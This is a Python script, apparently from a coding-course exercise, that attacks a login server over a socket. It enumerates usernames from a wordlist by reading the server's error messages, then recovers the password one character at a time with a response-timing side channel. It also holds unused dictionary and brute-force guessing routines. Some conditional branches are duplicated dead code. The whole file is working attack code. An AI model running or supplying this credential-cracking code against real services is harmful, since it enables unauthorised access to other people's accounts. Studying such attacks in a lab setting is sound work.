import sys
import socket
import itertools
from json import dumps, loads
from datetime import datetime

args = sys.argv  # Get command line arguments


def try_pass():
    list_ascii_low = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                      'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
    list_num = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    for i in range(1, 3):
        combs = itertools.product(itertools.chain(list_ascii_low, list_num), repeat=i)
        for x in combs:
            data = ''.join(x)
            data = data.encode()
            client_socket.send(data)
            response = client_socket.recv(1024).decode()
            if response == 'Connection success!':
                return [True, data.decode()]
            elif response == 'Connection success!':
                return [False, None]
    return [False, None]


def try_pass_dict():
    filename = 'passwords.txt'
    with open(filename) as f_obj:
        for line in f_obj:
            comb = line.rstrip()
            if not comb.isnumeric():
                for m in map(''.join, itertools.product(*zip(comb.upper(), comb.lower()))):
                    data = m.encode()
                    client_socket.send(data)
                    response = client_socket.recv(1024).decode()
                    if response == 'Connection success!':
                        return [True, data.decode()]
                    elif response == 'Connection success!':
                        return [False, None]
                    elif response == 'Too many attempts':
                        client_socket.connect(address)

            else:
                data = comb.encode()
                client_socket.send(data)
                response = client_socket.recv(1024).decode()
                if response == 'Connection success!':
                    return [True, data.decode()]
                elif response == 'Connection success!':
                    return [False, None]
                elif response == 'Too many attempts':
                    client_socket.connect(address)
    return [False, None]


def find_login():
    try_dict = {"login": "", "password": " "}
    filename = 'logins.txt'
    with open(filename) as f_obj:
        for line in f_obj:
            comb = line.rstrip()
            try_dict['login'] = comb
            data = dumps(try_dict).encode()
            client_socket.send(data)
            response = loads(client_socket.recv(1024).decode())
            if response['result'] == 'Wrong password!':
                return [True, comb]
    return [False, None]


def find_pass(log):
    list_ascii_low = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                      'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
                      'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L',
                      'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    list_num = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    try_dict = {"login": log, "password": " "}
    password = ''
    data = dumps(try_dict).encode()
    client_socket.send(data)
    response = loads(client_socket.recv(1024).decode())
    while response['result'] != 'Connection success!':
        t_dict = dict()
        combs = itertools.product(itertools.chain(list_ascii_low, list_num), repeat=1)
        for x in combs:
            new_pass = password
            new_pass += ''.join(x)
            try_dict['password'] = new_pass
            data = dumps(try_dict).encode()
            start = datetime.now()
            client_socket.send(data)
            response = loads(client_socket.recv(1024).decode())
            finish = datetime.now()
            difference = finish - start
            t_dict[difference] = ''.join(x)
            if response['result'] == 'Connection success!':
                return [True, dumps(try_dict)]
        new_char = t_dict[max(t_dict)]
        password += new_char
    return [False, None]


with socket.socket() as client_socket:  # Connect to address, send message and get response
    hostname = str(args[1])
    port = int(args[2])
    address = (hostname, port)
    client_socket.connect(address)
    f_l = find_login()
    if f_l[0]:
        login = f_l[1]
        f_p = find_pass(login)
        if f_p[0]:
            print(f_p[1])
    else:
        print('At least, we tried')
